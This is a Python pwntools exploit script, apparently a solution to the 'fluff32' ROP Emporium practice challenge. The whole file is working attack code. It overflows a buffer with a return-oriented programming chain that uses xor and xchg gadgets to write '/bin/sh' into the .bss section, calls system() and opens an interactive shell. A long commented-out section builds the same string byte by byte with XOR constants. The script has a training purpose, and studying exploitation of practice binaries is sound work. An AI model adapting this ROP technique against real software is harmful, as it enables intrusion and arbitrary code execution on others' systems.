#!/usr/bin/env python
# coding: utf-8
from pwn import *

context(os="linux", arch="i386")
# context.log_level = 'debug'

def main():
    conn = process("./fluff32")

    system       = 0x8048430
    bss_addr     = 0x804a040 + 0x10
    mov_ecx_edx  = 0x8048692 # pop    edi
                             # mov    DWORD PTR [ecx],edx
                             # pop    ebp
                             # pop    ebx
                             # xor    BYTE PTR [ecx],bl
                             # ret

    xchg_edx_ecx = 0x8048689 # xchg   edx,ecx
                             # pop    ebp
                             # mov    edx,0xdefaced0
                             # ret

    xor_edx_ebx = 0x804867b # xor    edx,ebx
                            # pop    ebp
                            # mov    edi,0xdeadbabe
                            # ret

    mov_edx = 0x804868c # mov    edx,0xdefaced0
                        # ret

    pop_ebx = 0x080483e1 # pop ebx ; ret

    xor_ecx_bl = 0x8048696 # pop    ebx
                           # xor    BYTE PTR [ecx],bl
                           # ret

    xor_edx_edx = 0x8048671 # xor    edx,edx
                            # pop    esi
                            # mov    ebp,0xcafebabe
                            # ret

    pop3ret = 0x080486f9 # pop esi ; pop edi ; pop ebp ; ret


    # ROP Chain
    payload = ""
    payload += "A" * 44

    # make bss_addr
    payload += p32(pop_ebx) # ebx = bss_addr
    payload += p32(bss_addr)

    payload += p32(xor_edx_edx) # edx = 0
    payload += "A" * 4 # padding

    payload += p32(xor_edx_ebx) # edx ^ ebx (edx = ebx)
    payload += "A" * 4 # padding

    payload += p32(xchg_edx_ecx)
    payload += "A" * 4 # padding

    # make /bin
    payload += p32(pop_ebx) # ebx = /bin
    payload += "/bin"

    payload += p32(xor_edx_edx) # edx = 0
    payload += "A" * 4 # padding

    payload += p32(xor_edx_ebx) # edx ^ ebx (edx = ebx)
    payload += "A" * 4 # padding

    # insert
    payload += p32(mov_ecx_edx) # ecx(bss_addr) = edx(/bin)
    payload += "A" * 4 # padding
    payload += "A" * 4 # padding
    payload += p32(0x00)


    # make bss_addr
    payload += p32(pop_ebx) # ebx = bss_addr
    payload += p32(bss_addr + 4)

    payload += p32(xor_edx_edx) # edx = 0
    payload += "A" * 4 # padding

    payload += p32(xor_edx_ebx) # edx ^ ebx (edx = ebx)
    payload += "A" * 4 # padding

    payload += p32(xchg_edx_ecx)
    payload += "A" * 4 # padding

    # make /sh\x00
    payload += p32(pop_ebx) # ebx = /bin
    payload += "/sh\x00"

    payload += p32(xor_edx_edx) # edx = 0
    payload += "A" * 4 # padding

    payload += p32(xor_edx_ebx) # edx ^ ebx (edx = ebx)
    payload += "A" * 4 # padding

    # insert
    payload += p32(mov_ecx_edx) # ecx(bss_addr) = edx(/sh\x00)
    payload += "A" * 4 # padding
    payload += "A" * 4 # padding
    payload += p32(0x00)


#
#
#
#     # make ecx
#     payload += p32(pop_ebx)
#     payload += p32(bss_xor_addr + 4)
#
#     payload += p32(mov_edx)
#
#     payload += p32(xor_edx_ebx)
#     payload += "A" * 4 # padding
#
#     payload += p32(xchg_edx_ecx)
#     payload += "A" * 4 # padding
#
#     # insert
#     payload += p32(mov_ecx_edx) # ecx(0x804a040) = edx(0xdefaced0)
#     payload += "A" * 4 # padding
#     payload += p32(0x00)
#
#     # make /bin/sh
#     # make ecx
#     payload += p32(pop_ebx)
#     payload += p32(bss_xor_addr)
#
#     payload += p32(mov_edx)
#
#     payload += p32(xor_edx_ebx)
#     payload += "A" * 4 # padding
#
#     payload += p32(xchg_edx_ecx)
#     payload += "A" * 4 # padding
#
# # memory
# # gdb-peda$ x/10wx 0x804a040
# # 0x804a040 <stderr@@GLIBC_2.0>:  0xdefaced0  0xdefaced0
#
#     # "/"
#     payload += p32(xor_ecx_bl)
#     payload += p32(0xff) # "/"(0x2f) = 0xd0 ^ 0xff
#
#     # make ecx
#     payload += p32(pop_ebx)
#     payload += p32(bss_xor_addr + 1)
#
#     payload += p32(mov_edx)
#
#     payload += p32(xor_edx_ebx)
#     payload += "A" * 4 # padding
#
#     payload += p32(xchg_edx_ecx)
#     payload += "A" * 4 # padding
#
#     # "b"
#     payload += p32(xor_ecx_bl)
#     payload += p32(0xac) # "b"(0x62) = 0xce ^ 0xac
#
#     # make ecx
#     payload += p32(pop_ebx)
#     payload += p32(bss_xor_addr + 2)
#
#     payload += p32(mov_edx)
#
#     payload += p32(xor_edx_ebx)
#     payload += "A" * 4 # padding
#
#     payload += p32(xchg_edx_ecx)
#     payload += "A" * 4 # padding
#
#     # "i"
#     payload += p32(xor_ecx_bl)
#     payload += p32(0x93) # "i"(0x69) = 0xfa ^ 0x93
#
#     # make ecx
#     payload += p32(pop_ebx)
#     payload += p32(bss_xor_addr + 3)
#
#     payload += p32(mov_edx)
#
#     payload += p32(xor_edx_ebx)
#     payload += "A" * 4 # padding
#
#     payload += p32(xchg_edx_ecx)
#     payload += "A" * 4 # padding
#
#     # "n"
#     payload += p32(xor_ecx_bl)
#     payload += p32(0xb0) # "n"(0x6e) = 0xde ^ 0xb0
#
#     # make ecx
#     payload += p32(pop_ebx)
#     payload += p32(bss_xor_addr + 4)
#
#     payload += p32(mov_edx)
#
#     payload += p32(xor_edx_ebx)
#     payload += "A" * 4 # padding
#
#     payload += p32(xchg_edx_ecx)
#     payload += "A" * 4 # padding
#
#     # "/"
#     payload += p32(xor_ecx_bl)
#     payload += p32(0xff) # "/"(0x2f) = 0xd0 ^ 0xff
#
#     # make ecx
#     payload += p32(pop_ebx)
#     payload += p32(bss_xor_addr + 5)
#
#     payload += p32(mov_edx)
#
#     payload += p32(xor_edx_ebx)
#     payload += "A" * 4 # padding
#
#     payload += p32(xchg_edx_ecx)
#     payload += "A" * 4 # padding
#
#     # "s"
#     payload += p32(xor_ecx_bl)
#     payload += p32(0xbd) # "s"(0x73) = 0xce ^ 0xbd
#
#     # make ecx
#     payload += p32(pop_ebx)
#     payload += p32(bss_xor_addr + 6)
#
#     payload += p32(mov_edx)
#
#     payload += p32(xor_edx_ebx)
#     payload += "A" * 4 # padding
#
#     payload += p32(xchg_edx_ecx)
#     payload += "A" * 4 # padding
#
#     # "h"
#     payload += p32(xor_ecx_bl)
#     payload += p32(0x92) # "h"(0x68) = 0xfa ^ 0x92
#
#     # make ecx
#     payload += p32(pop_ebx)
#     payload += p32(bss_xor_addr + 7)
#
#     payload += p32(mov_edx)
#
#     payload += p32(xor_edx_ebx)
#     payload += "A" * 4 # padding
#
#     payload += p32(xchg_edx_ecx)
#     payload += "A" * 4 # padding
#
#     # "\x00"
#     payload += p32(xor_ecx_bl)
#     payload += p32(0xde) # "\x00"(0x00) = 0xde ^ 0xde

    # # adjust edx(edx is 0?)
    # payload += p32(pop_ebx)
    # payload += p32(0xdefaced0)
    # payload += p32(xor_edx_ebx)
    # payload += "A" * 4 # padding
    #
    # adjust register
    # payload += p32(pop3ret)
    # payload += p32(0xf7fa8000) # padding
    # payload += p32(0xf7fa8000) # padding
    # payload += p32(0xffffbe18) # padding

    # system
    payload += p32(system)
    payload += "A" * 4 # padding
    payload += p32(bss_addr) # buffer

    # debug
    f = open("input.txt", "w")
    f.write(payload)
    f.close()

    print conn.recv(100)

    conn.send(payload)
    conn.interactive()


if __name__ == "__main__":
    main()
